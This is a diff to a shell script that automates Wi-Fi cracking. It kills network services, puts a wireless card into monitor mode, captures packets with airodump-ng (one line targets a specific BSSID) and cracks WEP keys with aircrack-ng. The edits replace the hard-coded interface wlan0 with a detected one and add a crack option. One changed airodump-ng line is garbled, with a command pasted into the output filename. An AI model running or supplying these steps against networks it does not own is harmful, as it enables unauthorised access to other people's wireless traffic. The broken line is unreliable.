@@ -3,6 +3,7 @@
 TERM=xterm
 alias dmenu='dmenu -nb "#333" -nf "#ccc" -sb "#111" -sf "#ff0"'
 
+WLANI=$(echo /proc/sys/net/ipv4/conf/w* | sed "s%.*/%%")
 
 # Only root may pass
 [ $USER = root ] || {
@@ -26,7 +27,7 @@ step() {
 
 #############
 
-iwlist wlan0 scan | xmessage -file -
+iwlist $WLANI scan | xmessage -file -
 
 cat <<EOF | step '1. Check (and kill) programs that could interfere with the wireless card'
 sudo /etc/rc.d/wicd stop; sudo /etc/rc.d/networkmanager stop; sudo pkill wpa_; sudo airmon-ng check kill
@@ -36,16 +37,16 @@ exit # skip this step
 EOF
 
 cat <<EOF | step '2. Turn card into monitor mode (optional specific channel)'
-sudo airmon-ng stop mon0; sudo airmon-ng start wlan0
-sudo airmon-ng start wlan0
-sudo airmon-ng start wlan0 2
-sudo airmon-ng start wlan0 6
+sudo airmon-ng stop mon0; sudo airmon-ng start $WLANI
+sudo airmon-ng start $WLANI
+sudo airmon-ng start $WLANI 2
+sudo airmon-ng start $WLANI 6
 exit # skip this step
 EOF
 
 cat <<EOF | step '3. Get packets with airodump-ng (keep terminal open)' &
 sudo airodump-ng mon0 -w ./wificrack --ivs --encrypt WEP  # only WEP
-sudo airodump-ng mon0 -w ./wificrack
+sudo airodump-ng mon0 -w ./wificrackecho /proc/sys/net/ipv4/conf/w* | sed "s%.*/%%"
 sudo airodump-ng mon0 -w ./wificrack --ivs -c 11 --bssid 00:01:E3:08:4C:9D
 exit # skip this step
 EOF
@@ -58,6 +59,7 @@ done
 sleep 3s # also wait for some packets
 
 cat <<EOF | step '4. Use collected packets to crack the encryption'
+aircrack-ng ./wificrack*.ivs -f 100 # WEP increased tries (if low number of IV)
 aircrack-ng ./wificrack*.ivs # WEP
 exit
 EOF
